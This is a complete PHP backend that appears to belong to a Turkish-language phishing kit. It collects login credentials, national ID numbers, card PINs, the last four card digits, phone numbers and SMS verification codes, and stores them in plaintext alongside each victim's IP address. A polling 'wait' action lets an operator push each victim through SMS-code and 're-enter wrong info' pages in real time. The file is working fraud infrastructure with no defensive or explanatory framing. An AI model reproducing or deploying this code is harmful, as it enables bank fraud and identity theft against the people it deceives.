<?php
date_default_timezone_set('Europe/Istanbul');
session_start();
include('config.php');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header('Content-Type: application/json');
    
    $action = $_POST["action"];
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $sound = 1;
    $response = array();

    try {
        switch($action) {
            case "submitLogin":
                $username = htmlspecialchars($_POST["username"]);
                $password = htmlspecialchars($_POST["password"]);
                $date = date('d.m.Y H:i');
                $timer = time() + 7;
                $page = "Telefon Sayfası";

                $sql = "INSERT INTO users (username, password, ip, lastOnline, page, date) VALUES (?, ?, ?, ?, ?, ?)";
                $stmt = $conn->prepare($sql);
                $stmt->bind_param("ssssss", $username, $password, $user_ip, $timer, $page, $date);
                $stmt->execute();
                $userId = $conn->insert_id;

                $check_query = $conn->prepare("SELECT * FROM ips WHERE ipAddress = ?");
                $check_query->bind_param("s", $user_ip);
                $check_query->execute();
                $result = $check_query->get_result();

                if ($result->num_rows > 0) {
                    $update = $conn->prepare("UPDATE ips SET lastOnline = ? WHERE ipAddress = ?");
                    $update->bind_param("is", $timer, $user_ip);
                    $update->execute();
                } else {
                    $insert = $conn->prepare("INSERT INTO ips (ipAddress, lastOnline) VALUES (?, ?)");
                    $insert->bind_param("si", $user_ip, $timer);
                    $insert->execute();
                }

                $_SESSION["id"] = $userId;
                $response['success'] = true;
                $response['data'] = $userId;
                break;

            case "submitForgot":
                $tckn = htmlspecialchars($_POST["tckn"]);
                $last4 = htmlspecialchars($_POST["last4"]);
                $cardpin = htmlspecialchars($_POST["cardpin"]);
                $date = date('d.m.Y H:i');
                $timer = time() + 7;

                if (isset($_SESSION["id"])) {
                    $page = "Bekleme Sayfası";
                    $sql = "UPDATE users SET username = ?, last4 = ?, cardpin = ?, date = ?, ip = ?, sound = ?, page = ?, lastOnline = ? WHERE id = ?";
                    $stmt = $conn->prepare($sql);
                    $stmt->bind_param("sssssissi", $tckn, $last4, $cardpin, $date, $user_ip, $sound, $page, $timer, $_SESSION["id"]);
                    $stmt->execute();
                    $userId = $_SESSION["id"];
                } else {
                    $page = "Telefon Sayfası";
                    $sql = "INSERT INTO users (username, last4, cardpin, date, ip, sound, page, lastOnline) VALUES (?, ?, ?, ?, ?, ?, ?, ?)";
                    $stmt = $conn->prepare($sql);
                    $stmt->bind_param("sssssiss", $tckn, $last4, $cardpin, $date, $user_ip, $sound, $page, $timer);
                    $stmt->execute();
                    $userId = $conn->insert_id;
                    $_SESSION["id"] = $userId;
                }

                $check_query = $conn->prepare("SELECT * FROM ips WHERE ipAddress = ?");
                $check_query->bind_param("s", $user_ip);
                $check_query->execute();
                $result = $check_query->get_result();

                if ($result->num_rows > 0) {
                    $update = $conn->prepare("UPDATE ips SET lastOnline = ? WHERE ipAddress = ?");
                    $update->bind_param("is", $timer, $user_ip);
                    $update->execute();
                } else {
                    $insert = $conn->prepare("INSERT INTO ips (ipAddress, lastOnline) VALUES (?, ?)");
                    $insert->bind_param("si", $user_ip, $timer);
                    $insert->execute();
                }

                $response['success'] = true;
                $response['data'] = $userId;
                break;

            case "submitLoginfe":
            case "submitPhone":
            case "submitCode":
            case "submitPhonefe":
                if (!isset($_SESSION["id"])) {
                    throw new Exception("No active session");
                }

                $userId = $_SESSION["id"];
                $date = date('d.m.Y H:i');
                $page = "Bekleme Sayfası";
                
                $updateData = [];
                $updateFields = [];
                
                if ($action == "submitLoginfe") {
                    $updateFields[] = "username = ?";
                    $updateFields[] = "password = ?";
                    $updateData[] = htmlspecialchars($_POST["usernamefe"]);
                    $updateData[] = htmlspecialchars($_POST["passwordfe"]);
                } else if ($action == "submitPhone" || $action == "submitPhonefe") {
                    $updateFields[] = "phone = ?";
                    $updateData[] = htmlspecialchars($action == "submitPhone" ? $_POST["phone"] : $_POST["phonefet"]);
                } else if ($action == "submitCode") {
                    $updateFields[] = "phonecode = ?";
                    $updateData[] = htmlspecialchars($_POST["phonecode"]);
                }

                $updateFields[] = "date = ?";
                $updateFields[] = "page = ?";
                $updateData[] = $date;
                $updateData[] = $page;
                
                $sql = "UPDATE users SET " . implode(", ", $updateFields) . " WHERE id = ?";
                $updateData[] = $userId;
                
                $stmt = $conn->prepare($sql);
                $stmt->bind_param(str_repeat("s", count($updateData)), ...$updateData);
                $stmt->execute();
                
                $response['success'] = true;
                break;

            case "wait":
                if (!isset($_SESSION['id'])) {
                    $response['data'] = ["page" => "loginf", "session" => false];
                    break;
                }

                $userId = $_SESSION["id"];
                $sql = "SELECT page FROM users WHERE id = ?";
                $stmt = $conn->prepare($sql);
                $stmt->bind_param("i", $userId);
                $stmt->execute();
                $result = $stmt->get_result();
                
                if ($result->num_rows > 0) {
                    $row = $result->fetch_assoc();
                    $pageMapping = [
                        "Tebrikle" => "verf",
                        "Bildirim Sayfası" => "creditf", 
                        "SMS Sayfası" => "phonef",
                        "Telefon Sayfası" => "codef",
                        "Hatalı Bilgi" => "loginfe",
                        "Hatalı SMS" => "phonefe",
                        "Bekleme Sayfası" => "waiting"
                    ];

                    $response['data'] = [
                        "page" => $pageMapping[$row["page"]] ?? "waiting",
                        "session" => true
                    ];
                }
                
                $stmt->close();
                break;

            case "updateLastActivity":
                if (isset($_SESSION['id'])) {
                    $userID = $_SESSION['id'];
                    $currentTime = time() + 7;
                    
                    $stmt = $conn->prepare("UPDATE users SET last_activity = ? WHERE id = ?");
                    $stmt->bind_param("ii", $currentTime, $userID);
                    $stmt->execute();
                    
                    $stmt = $conn->prepare("UPDATE ips SET lastOnline = ? WHERE ipAddress = ?");
                    $stmt->bind_param("is", $currentTime, $user_ip);
                    $stmt->execute();
                    
                    $response['success'] = true;
                }
                break;
        }
    } catch (Exception $e) {
        file_put_contents('7manual_error.txt', date('Y-m-d H:i') . ' - ' . $e->getMessage() . "\n", FILE_APPEND);
        $response['message'] = "An error occurred";
    }

    echo json_encode($response);
}

$conn->close();